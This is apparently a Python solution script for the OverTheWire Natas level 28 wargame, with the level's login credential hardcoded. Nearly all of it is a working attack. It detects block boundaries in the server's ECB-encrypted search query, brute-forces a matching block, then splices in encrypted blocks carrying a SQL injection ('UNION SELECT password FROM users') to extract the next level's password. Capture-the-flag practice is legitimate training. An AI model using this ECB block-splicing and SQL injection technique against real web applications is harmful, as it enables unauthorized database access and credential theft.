import requests
import re
import base64
import string

username = "natas28"
password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
url = "http://%s.natas.labs.overthewire.org/"  % username

queries = list()

session = requests.Session()

# ECB encryption testing

# Do some requests (first step to find the size of the block)
# for i in range(80):
# 	first = session.post(url,auth=(username,password),data={"query":"a"*i,"submit":"search"}, allow_redirects=False)
# 	query = requests.utils.unquote(first.headers["Location"])
# 	iHash = re.findall(r"^search.php/\Wquery=(.*)",query)[0]
# 	queries.append(base64.b64decode(iHash))
# 	print("length: "+ str(i) + " query len: " + str(len(queries[i])) + " query: " + iHash)

# more block testing (second step)
block_size = 16

for i in range(20):
	print(str(i+1) + "# request")
	response = session.post(url, auth = (username, password), data = {"query" : "a"*i}, allow_redirects=False)
	query = requests.utils.unquote(response.headers["Location"])
	iHash = re.findall(r"^search.php/\Wquery=(.*)",query)[0]
	queries.append(base64.b64decode(iHash))
	print("length: "+ str(i) + " query len: " + str(len(queries[i])) + "\nquery: " + iHash)
	# if (i > 1):
	# 	if len(queries[i]) - len(queries[i-1]):
	# 		print("><"*60)
	# 		print("Difference in length!!")
	print("-"*70)


# Reading the blocks of the queries
for i in range(len(queries)):
	print("query: " + str(i+1))
	for block in range(int(80/block_size)):
		print("block: " + str(block+1) + ", data:" )
		print(queries[i][block*block_size:(block+1)*block_size])
	print("><"*60)


correct_block = b"\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb"
# print(correct_block) # bytes
# print(correct_block.decode("utf-8")) # strings

for character in string.printable:
	print("Trying the character: " + character)
	response = session.post(url, auth = (username, password), data = {"query":"a"*9 + character}, allow_redirects=False)
	block = 2 # 3rd block
	query = requests.utils.unquote(response.headers["Location"])
	iHash = re.findall(r"^search.php/\Wquery=(.*)",query)[0]
	iHash = base64.b64decode(iHash)
	crucial = iHash[block*block_size:(block+1)*block_size] 
	print("="*50)
	print(str(crucial) + "\n" + str(correct_block))
	if crucial == correct_block:
		print("="*60)
		print("\nFound the character: " + character)
		break

injection = "a"*9 + "' UNION SELECT password FROM users; #"
blocks = int((len(injection) - 10) / block_size)

if (len(injection) - 10) % block_size != 0: blocks += 1

response = session.post(url, auth = (username, password), data = {"query":injection}, allow_redirects=False)
query = requests.utils.unquote(response.headers["Location"])
raw_injection = re.findall(r"^search.php/\Wquery=(.*)",query)[0]
raw_injection = base64.b64decode(raw_injection)

good_base = queries[10]

query = good_base[:block_size*3] + raw_injection[block_size*3:block_size*3+(blocks*block_size)] + good_base[block_size*3:]
query = requests.utils.quote(base64.b64encode(query)).replace("/","%2F")
response = session.get(url + '/search.php/?query='+query, auth = (username, password))
print(response.text)
print("="*60)
print("\nThe password for the next level is: " + re.findall("[a-zA-Z0-9]{32}",response.text)[1])